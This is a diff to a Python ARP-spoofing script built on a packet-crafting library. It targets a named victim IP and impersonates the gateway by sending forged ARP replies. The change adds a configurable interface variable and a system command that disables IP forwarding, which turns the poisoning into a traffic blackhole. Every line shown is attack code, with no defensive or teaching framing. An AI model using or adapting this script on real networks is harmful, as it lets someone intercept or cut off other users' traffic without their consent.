@@ -4,13 +4,15 @@
 import time
 from framebuilder import defs, eth, ipv4, tools
 
+INTERFACE = 'eth0'
+os.system(f'sysctl -w net.ipv4.conf.{INTERFACE}.forwarding=0')
 INTERVAL = 10**9
 VICTIM_IP = '10.0.0.100'
 VICTIM_MAC = tools.get_mac_for_dst_ip(VICTIM_IP)
 GATEWAY_IP = '10.0.0.1'
 GATEWAY_MAC = tools.get_mac_for_dst_ip(GATEWAY_IP)
 OWN_IP = '10.0.0.200'
-OWN_MAC = tools.get_mac_addr('eth0')
+OWN_MAC = tools.get_mac_addr(INTERFACE)
 
 print(f'pretend {GATEWAY_IP} to be at {OWN_MAC}')
 
@@ -34,7 +36,7 @@ arp_data_gateway = {'operation': 2,
 
 arp_msg_gateway = eth.ArpMessage(arp_data_gateway)
 
-eth_handler = eth.EthernetHandler('eth0', local_mac=OWN_MAC, remote_mac=VICTIM_MAC, block=0)
+eth_handler = eth.EthernetHandler(INTERFACE, local_mac=OWN_MAC, remote_mac=VICTIM_MAC, block=0)
 # current time
 ctime = 0
 
